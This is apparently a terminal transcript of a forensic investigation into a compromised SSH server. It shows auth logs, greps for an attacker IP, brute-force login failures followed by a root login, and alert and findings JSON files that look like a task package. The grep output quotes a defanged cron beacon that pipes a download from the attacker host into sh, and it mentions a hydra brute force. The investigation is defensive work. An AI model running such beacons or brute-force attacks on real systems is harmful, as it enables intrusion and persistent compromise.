+Aug 15 01:16:04 ssh-prod-01 sshd[2117]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Aug 15 01:16:17 ssh-prod-01 sshd[5424]: pam_unix(sshd:session): session opened for user svc-backup by (uid=0)
+Aug 15 01:16:38 ssh-prod-01 sshd[1645]: pam_unix(sudo:session): session opened for user root by root(uid=1005)
+Aug 15 01:16:39 ssh-prod-01 sshd[4868]: Received disconnect from 10.10.105.15 port 51741:11: disconnected by user
+Aug 15 01:17:01 ssh-prod-01 sshd[1329]: Accepted publickey for jenkins from 10.10.105.130 port 41826 ssh2: RSA SHA256:2f03cd51
+Aug 15 01:17:24 ssh-prod-01 sshd[1605]: Received disconnect from 10.10.105.100 port 46367:11: disconnected by user
+Aug 15 01:17:45 ssh-prod-01 sshd[6069]: Accepted publickey for webadmin from 10.10.105.154 port 59589 ssh2: RSA SHA256:1a3eeb57
+Aug 15 01:18:19 ssh-prod-01 sshd[6732]: Accepted publickey for webadmin from 10.10.105.235 port 45270 ssh2: RSA SHA256:07c1c247
+Aug 15 01:18:35 ssh-prod-01 sshd[5672]: pam_unix(sudo:session): session opened for user root by postgres(uid=1003)
+Aug 15 01:19:08 ssh-prod-01 sshd[4449]: Received disconnect from 10.10.105.114 port 59009:11: disconnected by user
+Aug 15 01:19:31 ssh-prod-01 sshd[2040]: Received disconnect from 10.10.105.36 port 42752:11: disconnected by user
+Aug 15 01:19:37 ssh-prod-01 sshd[1044]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Aug 15 01:20:06 ssh-prod-01 sshd[5794]: pam_unix(sudo:session): session opened for user root by devops(uid=1000)
+Aug 15 01:20:18 ssh-prod-01 sshd[7355]: Received disconnect from 10.10.105.224 port 49714:11: disconnected by user
+Aug 15 01:20:32 ssh-prod-01 sshd[4398]: Received disconnect from 10.10.105.163 port 59405:11: disconnected by user
+Aug 15 01:20:52 ssh-prod-01 sshd[7328]: Received disconnect from 10.10.105.69 port 62724:11: disconnected by user
+Aug 15 01:21:26 ssh-prod-01 sshd[1180]: pam_unix(sudo:session): session opened for user root by devops(uid=1005)
+Aug 15 01:22:03 ssh-prod-01 sshd[4547]: Received disconnect from 10.10.105.12 port 59079:11: disconnected by user
+Aug 15 01:22:09 ssh-prod-01 sshd[4195]: Accepted publickey for svc-backup from 10.10.105.26 port 62726 ssh2: RSA SHA256:29367934
+Aug 15 01:22:39 ssh-prod-01 sshd[8921]: Received disconnect from 10.10.105.155 port 52953:11: disconnected by user
+Aug 15 01:23:24 ssh-prod-01 sshd[2714]: pam_unix(sudo:session): session opened for user root by root(uid=1005)
+Aug 15 01:23:53 ssh-prod-01 sshd[3995]: pam_unix(sudo:session): session opened for user root by devops(uid=1002)
+Aug 15 01:24:12 ssh-prod-01 sshd[8848]: Received disconnect from 10.10.105.20 port 54037:11: disconnected by user
+Aug 15 01:24:21 ssh-prod-01 sshd[4295]: Accepted publickey for webadmin from 10.10.105.69 port 46773 ssh2: RSA SHA256:3384ea51
+Aug 15 01:24:26 ssh-prod-01 sshd[4438]: pam_unix(sshd:session): session opened for user svc-backup by (uid=0)
+Aug 15 01:24:32 ssh-prod-01 sshd[1921]: Received disconnect from 10.10.105.205 port 48740:11: disconnected by user
+[?2004hroot@58bb37a3cf48:/app# grep -rn "198.51.100.78" /disk/
+[?2004l[35m[K/disk/var/spool/cron/root[m[K[36m[K:[m[K[32m[K5[m[K[36m[K:[m[K# * * * * * root <defanged beacon: curl hxxp://[01;31m[K198.51.100.78[m[K/x | sh> ‚Äî cron persistence re-drops xmrig / pgdaemon / php / redis / wget payload
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K141[m[K[36m[K:[m[KAug 15 00:53:24 ssh-prod-01 sshd[1201]: Failed password for oracle from [01;31m[K198.51.100.78[m[K port 40819 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K142[m[K[36m[K:[m[KAug 15 00:53:25 ssh-prod-01 sshd[1201]: Failed password for oracle from [01;31m[K198.51.100.78[m[K port 44818 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K143[m[K[36m[K:[m[KAug 15 00:53:26 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 40136 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K144[m[K[36m[K:[m[KAug 15 00:53:29 ssh-prod-01 sshd[1201]: Failed password for test from [01;31m[K198.51.100.78[m[K port 45658 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K145[m[K[36m[K:[m[KAug 15 00:53:30 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 61805 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K146[m[K[36m[K:[m[KAug 15 00:53:32 ssh-prod-01 sshd[1201]: Failed password for admin from [01;31m[K198.51.100.78[m[K port 60115 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K147[m[K[36m[K:[m[KAug 15 00:53:34 ssh-prod-01 sshd[1201]: Failed password for postgres from [01;31m[K198.51.100.78[m[K port 53471 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K148[m[K[36m[K:[m[KAug 15 00:53:36 ssh-prod-01 sshd[1201]: Failed password for postgres from [01;31m[K198.51.100.78[m[K port 58572 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K149[m[K[36m[K:[m[KAug 15 00:53:40 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 59248 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K150[m[K[36m[K:[m[KAug 15 00:53:44 ssh-prod-01 sshd[1201]: Failed password for test from [01;31m[K198.51.100.78[m[K port 42161 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K151[m[K[36m[K:[m[KAug 15 00:53:45 ssh-prod-01 sshd[1201]: Failed password for test from [01;31m[K198.51.100.78[m[K port 44623 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K152[m[K[36m[K:[m[KAug 15 00:53:47 ssh-prod-01 sshd[1201]: Failed password for test from [01;31m[K198.51.100.78[m[K port 40416 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K153[m[K[36m[K:[m[KAug 15 00:53:50 ssh-prod-01 sshd[1201]: Failed password for postgres from [01;31m[K198.51.100.78[m[K port 47380 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K154[m[K[36m[K:[m[KAug 15 00:53:52 ssh-prod-01 sshd[1201]: Failed password for oracle from [01;31m[K198.51.100.78[m[K port 52280 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K155[m[K[36m[K:[m[KAug 15 00:53:56 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 53433 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K156[m[K[36m[K:[m[KAug 15 00:53:58 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 61891 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K157[m[K[36m[K:[m[KAug 15 00:54:00 ssh-prod-01 sshd[1201]: Failed password for admin from [01;31m[K198.51.100.78[m[K port 46554 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K158[m[K[36m[K:[m[KAug 15 00:54:03 ssh-prod-01 sshd[1201]: Failed password for oracle from [01;31m[K198.51.100.78[m[K port 60712 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K159[m[K[36m[K:[m[KAug 15 00:54:07 ssh-prod-01 sshd[1201]: Failed password for oracle from [01;31m[K198.51.100.78[m[K port 48093 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K160[m[K[36m[K:[m[KAug 15 00:54:11 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 44844 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K161[m[K[36m[K:[m[KAug 15 00:54:12 ssh-prod-01 sshd[1201]: Failed password for oracle from [01;31m[K198.51.100.78[m[K port 50036 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K162[m[K[36m[K:[m[KAug 15 00:54:14 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 58295 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K163[m[K[36m[K:[m[KAug 15 00:54:16 ssh-prod-01 sshd[1201]: Failed password for test from [01;31m[K198.51.100.78[m[K port 45491 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K164[m[K[36m[K:[m[KAug 15 00:54:18 ssh-prod-01 sshd[1201]: Failed password for test from [01;31m[K198.51.100.78[m[K port 61129 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K165[m[K[36m[K:[m[KAug 15 00:54:19 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 51909 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K166[m[K[36m[K:[m[KAug 15 00:54:20 ssh-prod-01 sshd[1201]: Failed password for oracle from [01;31m[K198.51.100.78[m[K port 60358 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K167[m[K[36m[K:[m[KAug 15 00:54:23 ssh-prod-01 sshd[1201]: Failed password for admin from [01;31m[K198.51.100.78[m[K port 45938 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K168[m[K[36m[K:[m[KAug 15 00:54:26 ssh-prod-01 sshd[1201]: Failed password for postgres from [01;31m[K198.51.100.78[m[K port 45276 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K169[m[K[36m[K:[m[KAug 15 00:54:30 ssh-prod-01 sshd[1201]: Failed password for admin from [01;31m[K198.51.100.78[m[K port 51392 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K170[m[K[36m[K:[m[KAug 15 00:54:33 ssh-prod-01 sshd[1201]: Failed password for admin from [01;31m[K198.51.100.78[m[K port 44727 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K171[m[K[36m[K:[m[KAug 15 00:54:34 ssh-prod-01 sshd[1201]: Failed password for test from [01;31m[K198.51.100.78[m[K port 46529 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K172[m[K[36m[K:[m[KAug 15 00:54:36 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 63332 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K173[m[K[36m[K:[m[KAug 15 00:54:40 ssh-prod-01 sshd[1201]: Failed password for postgres from [01;31m[K198.51.100.78[m[K port 57870 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K174[m[K[36m[K:[m[KAug 15 00:54:42 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 40920 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K175[m[K[36m[K:[m[KAug 15 00:54:44 ssh-prod-01 sshd[1201]: Failed password for oracle from [01;31m[K198.51.100.78[m[K port 57049 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K176[m[K[36m[K:[m[KAug 15 00:54:48 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 55827 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K177[m[K[36m[K:[m[KAug 15 00:54:52 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 57223 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[K[32m[K178[m[K[36m[K:[m[KAug 15 00:54:55 ssh-prod-01 sshd[1201]: Accepted password for root from [01;31m[K198.51.100.78[m[K port 51900 ssh2
+grep: /disk/var/lib/.cache/.wiped.bin: binary file matches
+[35m[K/disk/root/.bashrc[m[K[36m[K:[m[K[32m[K2[m[K[36m[K:[m[Kshell-init persistence: PROMPT_COMMAND beacon to [01;31m[K198.51.100.78[m[K (defanged)
+[?2004hroot@58bb37a3cf48:/app# grep -rn "hydra" /disk/
+[?2004l[35m[K/disk/home/devops/.bash_history[m[K[36m[K:[m[K[32m[K6[m[K[36m[K:[m[K[01;31m[Khydra[m[K-style SSH brute-force against sshd (wordlist, user=root) ‚Äî defanged, not executed here
+[?2004hroot@58bb37a3cf48:/app# grep -rn "wiped" /disk/
+[?2004l[?2004hroot@58bb37a3cf48:/app# sed -n '170,200p' /disk/var/log/secure
+[?2004lAug 15 00:54:33 ssh-prod-01 sshd[1201]: Failed password for admin from 198.51.100.78 port 44727 ssh2
+Aug 15 00:54:34 ssh-prod-01 sshd[1201]: Failed password for test from 198.51.100.78 port 46529 ssh2
+Aug 15 00:54:36 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 63332 ssh2
+Aug 15 00:54:40 ssh-prod-01 sshd[1201]: Failed password for postgres from 198.51.100.78 port 57870 ssh2
+Aug 15 00:54:42 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 40920 ssh2
+Aug 15 00:54:44 ssh-prod-01 sshd[1201]: Failed password for oracle from 198.51.100.78 port 57049 ssh2
+Aug 15 00:54:48 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 55827 ssh2
+Aug 15 00:54:52 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 57223 ssh2
+Aug 15 00:54:55 ssh-prod-01 sshd[1201]: Accepted password for root from 198.51.100.78 port 51900 ssh2
+Aug 15 01:29:12 ssh-prod-01 sshd[8675]: pam_unix(sudo:session): session opened for user root by postgres(uid=1002)
+Aug 15 01:29:48 ssh-prod-01 sshd[7439]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Aug 15 01:30:01 ssh-prod-01 sshd[8733]: Accepted publickey for webadmin from 10.10.105.199 port 53234 ssh2: RSA SHA256:29b67f4d
+Aug 15 01:30:21 ssh-prod-01 sshd[7849]: pam_unix(sudo:session): session opened for user root by jenkins(uid=1000)
+Aug 15 01:30:28 ssh-prod-01 sshd[6981]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Aug 15 01:30:45 ssh-prod-01 sshd[4505]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+Aug 15 01:31:21 ssh-prod-01 sshd[8760]: Accepted publickey for devops from 10.10.105.96 port 49951 ssh2: RSA SHA256:5b8f3212
+Aug 15 01:31:38 ssh-prod-01 sshd[4664]: pam_unix(sshd:session): session opened for user svc-backup by (uid=0)
+Aug 15 01:32:08 ssh-prod-01 sshd[1104]: Received disconnect from 10.10.105.159 port 61904:11: disconnected by user
+Aug 15 01:32:09 ssh-prod-01 sshd[3838]: pam_unix(sshd:session): session opened for user postgres by (uid=0)
+Aug 15 01:32:19 ssh-prod-01 sshd[2978]: Accepted publickey for root from 10.10.105.163 port 60169 ssh2: RSA SHA256:1273a972
+Aug 15 01:32:43 ssh-prod-01 sshd[7708]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+Aug 15 01:33:22 ssh-prod-01 sshd[4599]: Accepted publickey for postgres from 10.10.105.135 port 49969 ssh2: RSA SHA256:56f1fa61
+Aug 15 01:33:47 ssh-prod-01 sshd[6249]: Accepted publickey for postgres from 10.10.105.39 port 63127 ssh2: RSA SHA256:26995049
+Aug 15 01:34:28 ssh-prod-01 sshd[1195]: Accepted publickey for devops from 10.10.105.95 port 64778 ssh2: RSA SHA256:389ed169
+Aug 15 01:35:08 ssh-prod-01 sshd[4668]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+Aug 15 01:35:45 ssh-prod-01 sshd[1932]: pam_unix(sudo:session): session opened for user root by jenkins(uid=1001)
+Aug 15 01:36:21 ssh-prod-01 sshd[5478]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Aug 15 01:36:56 ssh-prod-01 sshd[3901]: Received disconnect from 10.10.105.84 port 41161:11: disconnected by user
+Aug 15 01:37:39 ssh-prod-01 sshd[3950]: Received disconnect from 10.10.105.147 port 56248:11: disconnected by user
+Aug 15 01:38:14 ssh-prod-01 sshd[2522]: Accepted publickey for svc-backup from 10.10.105.19 port 61731 ssh2: RSA SHA256:2fd798b8
+Aug 15 01:38:16 ssh-prod-01 sshd[7892]: pam_unix(sudo:session): session opened for user root by postgres(uid=1002)
+[?2004hroot@58bb37a3cf48:/app# wc -l /disk/var/log/secure /disk/var/log/messages /disk/var/log/kern.log
+[?2004l   443 /disk/var/log/secure
+   427 /disk/var/log/messages
+   172 /disk/var/log/kern.log
+  1042 total
+[?2004hroot@58bb37a3cf48:/app# grep -C 5 "00:54" /disk/var/log/messages /disk/var/log/kern.log
+[?2004l[?2004hroot@58bb37a3cf48:/app# head -n 20 /disk/var/log/messages
+[?2004lAug 15 01:06:51 ssh-prod-01 systemd-logind[23634]: Time synchronised to time server
+Aug 15 01:07:13 ssh-prod-01 CRON[14024]: pam_unix(cron:session): session opened for user root
+Aug 15 01:08:00 ssh-prod-01 sshd[17369]: Started Session 204 of user jenkins.
+Aug 15 01:08:37 ssh-prod-01 sudo[28129]: Received disconnect from 10.10.105.64 port 55013:11: disconnected by user
+Aug 15 01:09:20 ssh-prod-01 sudo[20991]: Time synchronised to time server
+Aug 15 01:09:30 ssh-prod-01 dbus-daemon[20607]: Time synchronised to time server
+Aug 15 01:10:16 ssh-prod-01 sshd[25642]: Time synchronised to time server
+Aug 15 01:10:42 ssh-prod-01 sudo[27950]: pam_unix(cron:session): session opened for user root
+Aug 15 01:11:14 ssh-prod-01 dbus-daemon[25952]: Started Session 683 of user devops.
+Aug 15 01:11:55 ssh-prod-01 chronyd[22956]: pam_unix(cron:session): session opened for user root
+Aug 15 01:12:38 ssh-prod-01 sshd[18753]: Received disconnect from 10.10.105.74 port 58228:11: disconnected by user
+Aug 15 01:13:20 ssh-prod-01 dbus-daemon[21024]: Received disconnect from 10.10.105.93 port 54112:11: disconnected by user
+Aug 15 01:13:34 ssh-prod-01 chronyd[2111]: Received disconnect from 10.10.105.56 port 62151:11: disconnected by user
+Aug 15 01:14:08 ssh-prod-01 sudo[15417]: CPU0: Package temperature normal
+Aug 15 01:14:53 ssh-prod-01 systemd[19181]: pam_unix(cron:session): session opened for user root
+Aug 15 01:14:54 ssh-prod-01 systemd-logind[17978]: CPU0: Package temperature normal
+Aug 15 01:15:45 ssh-prod-01 CRON[12695]: pam_unix(cron:session): session opened for user root
+Aug 15 01:16:16 ssh-prod-01 systemd-logind[18451]: pam_unix(cron:session): session opened for user root
+Aug 15 01:16:38 ssh-prod-01 systemd-logind[5332]: Time synchronised to time server
+Aug 15 01:17:27 ssh-prod-01 CRON[29561]: pam_unix(cron:session): session opened for user root
+[?2004hroot@58bb37a3cf48:/app# tail -n 20 /disk/var/log/messages
+[?2004lAug 15 04:16:27 ssh-prod-01 systemd-logind[6803]: pam_unix(cron:session): session opened for user root
+Aug 15 04:17:14 ssh-prod-01 CRON[6110]: Time synchronised to time server
+Aug 15 04:17:36 ssh-prod-01 systemd[25144]: Received disconnect from 10.10.105.95 port 41081:11: disconnected by user
+Aug 15 04:18:23 ssh-prod-01 systemd-logind[29988]: Started Session 633 of user svc-backup.
+Aug 15 04:18:28 ssh-prod-01 dbus-daemon[29949]: pam_unix(cron:session): session opened for user root
+Aug 15 04:18:46 ssh-prod-01 systemd-logind[18480]: Received disconnect from 10.10.105.4 port 48056:11: disconnected by user
+Aug 15 04:19:37 ssh-prod-01 kernel[7979]: pam_unix(cron:session): session opened for user root
+Aug 15 04:19:49 ssh-prod-01 sshd[25303]: pam_unix(cron:session): session opened for user root
+Aug 15 04:20:43 ssh-prod-01 systemd[28086]: pam_unix(cron:session): session opened for user root
+Aug 15 04:21:06 ssh-prod-01 dbus-daemon[28648]: Time synchronised to time server
+Aug 15 04:21:54 ssh-prod-01 chronyd[10144]: Time synchronised to time server
+Aug 15 04:22:27 ssh-prod-01 sshd[10219]: pam_unix(cron:session): session opened for user root
+Aug 15 04:22:42 ssh-prod-01 chronyd[29215]: Time synchronised to time server
+Aug 15 04:23:34 ssh-prod-01 systemd[1709]: Started Session 357 of user jenkins.
+Aug 15 04:24:05 ssh-prod-01 dbus-daemon[16076]: Started Session 619 of user devops.
+Aug 15 04:24:52 ssh-prod-01 systemd-logind[17963]: Started Session 232 of user root.
+Aug 15 04:25:17 ssh-prod-01 kernel[12879]: CPU0: Package temperature normal
+Aug 15 04:25:46 ssh-prod-01 chronyd[24547]: pam_unix(cron:session): session opened for user root
+Aug 15 04:26:00 ssh-prod-01 systemd[12044]: Received disconnect from 10.10.105.30 port 41165:11: disconnected by user
+Aug 15 04:26:14 ssh-prod-01 dbus-daemon[303]: Time synchronised to time server
+[?2004hroot@58bb37a3cf48:/app# head -n 20 /disk/var/log/kern.log
+[?2004lAug 15 01:06:58 ssh-prod-01 chronyd[18968]: Received disconnect from 10.10.105.242 port 62807:11: disconnected by user
+Aug 15 01:07:44 ssh-prod-01 systemd-logind[10186]: Started Session 611 of user svc-backup.
+Aug 15 01:08:03 ssh-prod-01 sshd[29189]: Received disconnect from 10.10.105.218 port 44151:11: disconnected by user
+Aug 15 01:08:48 ssh-prod-01 systemd-logind[4117]: CPU0: Package temperature normal
+Aug 15 01:09:41 ssh-prod-01 chronyd[19875]: Received disconnect from 10.10.105.91 port 45166:11: disconnected by user
+Aug 15 01:09:49 ssh-prod-01 CRON[5539]: Time synchronised to time server
+Aug 15 01:10:30 ssh-prod-01 dbus-daemon[1540]: Time synchronised to time server
+Aug 15 01:10:49 ssh-prod-01 systemd-logind[2268]: Time synchronised to time server
+Aug 15 01:11:00 ssh-prod-01 sudo[10102]: Started Session 250 of user root.
+Aug 15 01:11:24 ssh-prod-01 kernel[16140]: CPU0: Package temperature normal
+Aug 15 01:12:02 ssh-prod-01 systemd-logind[11306]: CPU0: Package temperature normal
+Aug 15 01:12:37 ssh-prod-01 CRON[21418]: CPU0: Package temperature normal
+Aug 15 01:13:17 ssh-prod-01 sudo[19008]: CPU0: Package temperature normal
+Aug 15 01:13:48 ssh-prod-01 sshd[17289]: pam_unix(cron:session): session opened for user root
+Aug 15 01:14:12 ssh-prod-01 dbus-daemon[7531]: Time synchronised to time server
+Aug 15 01:14:55 ssh-prod-01 systemd-logind[21419]: pam_unix(cron:session): session opened for user root
+Aug 15 01:15:31 ssh-prod-01 CRON[17026]: Received disconnect from 10.10.105.126 port 59083:11: disconnected by user
+Aug 15 01:16:24 ssh-prod-01 chronyd[5307]: Received disconnect from 10.10.105.88 port 60845:11: disconnected by user
+Aug 15 01:17:16 ssh-prod-01 systemd-logind[7983]: Received disconnect from 10.10.105.198 port 40256:11: disconnected by user
+Aug 15 01:17:24 ssh-prod-01 systemd-logind[5935]: pam_unix(cron:session): session opened for user root
+[?2004hroot@58bb37a3cf48:/app# tail -n 20 /disk/var/log/kern.log
+[?2004lAug 15 02:12:19 ssh-prod-01 systemd-logind[26446]: CPU0: Package temperature normal
+Aug 15 02:12:27 ssh-prod-01 dbus-daemon[16364]: Received disconnect from 10.10.105.49 port 42267:11: disconnected by user
+Aug 15 02:12:47 ssh-prod-01 systemd-logind[11946]: Time synchronised to time server
+Aug 15 02:13:04 ssh-prod-01 systemd-logind[28900]: Started Session 863 of user svc-backup.
+Aug 15 02:13:39 ssh-prod-01 chronyd[26210]: pam_unix(cron:session): session opened for user root
+Aug 15 02:14:18 ssh-prod-01 systemd-logind[3742]: Received disconnect from 10.10.105.217 port 42209:11: disconnected by user
+Aug 15 02:14:49 ssh-prod-01 dbus-daemon[11038]: pam_unix(cron:session): session opened for user root
+Aug 15 02:15:14 ssh-prod-01 sshd[6498]: CPU0: Package temperature normal
+Aug 15 02:15:24 ssh-prod-01 kernel[29659]: CPU0: Package temperature normal
+Aug 15 02:16:06 ssh-prod-01 systemd[20125]: Time synchronised to time server
+Aug 15 02:16:13 ssh-prod-01 CRON[13371]: Started Session 602 of user devops.
+Aug 15 02:16:19 ssh-prod-01 systemd[27710]: Started Session 343 of user root.
+Aug 15 02:16:57 ssh-prod-01 systemd-logind[16065]: pam_unix(cron:session): session opened for user root
+Aug 15 02:17:37 ssh-prod-01 systemd[15494]: Time synchronised to time server
+Aug 15 02:18:27 ssh-prod-01 kernel[29140]: Time synchronised to time server
+Aug 15 02:18:46 ssh-prod-01 sudo[22120]: Time synchronised to time server
+Aug 15 02:19:25 ssh-prod-01 dbus-daemon[15165]: Time synchronised to time server
+Aug 15 02:19:48 ssh-prod-01 sshd[14184]: pam_unix(cron:session): session opened for user root
+Aug 15 02:20:37 ssh-prod-01 sshd[14076]: Started Session 549 of user webadmin.
+Aug 15 02:21:22 ssh-prod-01 systemd[861]: Time synchronised to time server
+[?2004hroot@58bb37a3cf48:/app# cat /sas/handoff/findings.schema.json
+[?2004l{
+  "$schema": "http://json-schema.org/draft-07/schema#",
+  "title": "finding",
+  "type": "object",
+  "required": [
+    "chk",
+    "path",
+    "attck",
+    "confidence",
+    "evidence"
+  ],
+  "properties": {
+    "chk": {
+      "type": "string"
+    },
+    "path": {
+      "type": "string"
+    },
+    "attck": {
+      "type": "string",
+      "pattern": "^T\\d{4}(\\.\\d{3})?$"
+    },
+    "confidence": {
+      "enum": [
+        "low",
+        "medium",
+        "high"
+      ]
+    },
+    "evidence": {
+      "type": "string",
+      "description": "backtick-cited /disk or /sas path"
+    }
+  }
+}
+[?2004hroot@58bb37a3cf48:/app# cat /sas/handoff/findings.partial.json
+[?2004l{
+  "findings": [
+    {
+      "chk": "CHK-01",
+      "path": "/tmp/.X11-unix/.xorg",
+      "attck": "T1496",
+      "confidence": "high",
+      "evidence": "`/tmp/.X11-unix/.xorg`"
+    },
+    {
+      "chk": "TODO",
+      "path": "TODO",
+      "attck": "TODO",
+      "confidence": "TODO",
+      "evidence": "TODO"
+    }
+  ]
+}
+[?2004hroot@58bb37a3cf48:/app# cat /sas/alerts.json
+[?2004l[
+  {
+    "id": "ALERT-01",
+    "chk": "CHK-01",
+    "kind": "miner-process",
+    "path": "/tmp/.X11-unix/.xorg",
+    "capability": "ENT-P01",
+    "summary": "miner-process observed at /tmp/.X11-unix/.xorg"
+  },
+  {
+    "id": "ALERT-02",
+    "chk": "CHK-02",
+    "kind": "miner-binary",
+    "path": "/tmp/.X11-unix/.xorg",
+    "capability": "ENT-F02",
+    "summary": "miner-binary observed at /tmp/.X11-unix/.xorg"
+  },
+  {
+    "id": "ALERT-03",
+    "chk": "CHK-04",
+    "kind": "ssh-baseline",
+    "path": "/etc/ssh/sshd_config",
+    "capability": "BAS-01",
+    "summary": "ssh-baseline observed at /etc/ssh/sshd_config"
+  },
+  {
+    "id": "ALERT-04",
+    "chk": "CHK-09",
+    "kind": "mysql-remote-root",
+    "path": "/etc/my.cnf",
+    "capability": "BAS-02",
+    "summary": "mysql-remote-root observed at /etc/my.cnf"
+  },
+  {
+    "id": "ALERT-05",
+    "chk": "CHK-11",
+    "kind": "cron",
+    "path": "/var/spool/cron/root",
+    "capability": "PER-S01",
+    "summary": "cron observed at /var/spool/cron/root"
+  },
+  {
+    "id": "ALERT-06",
+    "chk": "CHK-13",
+    "kind": "systemd",
+    "path": "/etc/systemd/system/system-update-helper.service",
+    "capability": "PER-V01",
+    "summary": "systemd observed at /etc/systemd/system/system-update-helper.service"
+  }
+]
+[?2004hroot@58bb37a3cf48:/app# cat /sas/baseline.json
+[?2004l[
+  {
+    "chk": "CHK-04",
+    "path": "/etc/ssh/sshd_config",
+    "check": "ssh-baseline",
+    "capability": "BAS-01"
+  },
+  {
+    "chk": "CHK-09",
+    "path": "/etc/my.cnf",
+    "check": "mysql-remote-root",
+    "capability": "BAS-02"
+  }
+]
+[?2004hroot@58bb37a3cf48:/app# grep -n "." /disk/var/spool/cron/root
+[?2004l[32m[K1[m[K[36m[K:[m[K[01;31m[K#[m[K[01;31m[K [m[K[01;31m[Km[m[K[01;31m[K [m[K[01;31m[Kh[m[K[01;31m[K [m[K[01;31m[Kd[m[K[01;31m[Ko[m[K[01;31m[Km[m[K[01;31m[K [m[K[01;31m[Km[m[K[01;31m[Ko[m[K[01;31m[Kn[m[K[01;31m[K [m[K[01;31m[Kd[m[K[01;31m[Ko[m[K[01;31m[Kw[m[K[01;31m[K [m[K[01;31m[Ku[m[K[01;31m[Ks[m[K[01;31m[Ke[m[K[01;31m[Kr[m[K[01;31m[K [m[K[01;31m[Kc[m[K[01;31m[Ko[m[K[01;31m[Km[m[K[01;31m[Km[m[K[01;31m[Ka[m[K[01;31m[Kn[m[K[01;31m[Kd[m[K
